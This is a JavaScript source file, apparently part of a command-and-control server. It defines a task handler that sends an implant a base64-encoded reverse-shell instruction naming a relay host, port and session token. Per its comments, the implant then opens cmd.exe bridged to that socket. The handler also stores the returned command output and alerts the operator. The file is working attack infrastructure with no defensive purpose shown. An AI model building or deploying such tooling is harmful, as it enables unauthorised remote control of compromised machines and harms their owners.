// TCP Relay Shell Task Handler
// Sends a REVSHELL:host:port:token instruction to the implant.
// The implant connects to the station's TCP relay on the given host:port,
// presents the session token, and spawns cmd.exe with stdio bridged to the socket.
export class TaskHandler {
  constructor(task) {
    this.task = task
  }

  getTask = async function (req, res) {
    const { host, port, token } = JSON.parse(this.task.parameters)
    const payload     = `REVSHELL:${host}:${port}:${token}`
    const instruction = `${this.task.id}:${Buffer.from(payload).toString('base64')}`
    const display     = `TCP Shell → ${host}:${port}`
    db.prepare(`UPDATE tasks SET display = $display WHERE id = $task_id`)
      .run({ task_id: this.task.id, display })
    this.task.display = display
    res.send(instruction)
  }

  taskIO = async function (req, res) {
    this.task.output      = Buffer.from(req.body, 'base64').toString('utf8')
    this.task.completed_at = Date.now()
    db.prepare(`UPDATE tasks SET (output, completed_at) = ($output, $completed_at) WHERE id = $task_id`)
      .run({ task_id: this.task.id, output: this.task.output, completed_at: this.task.completed_at })
    res.type('text/plain').send('success')
    io('task_complete', this.task)
    delete active_implant_handlers[this.task.id]
  }
}
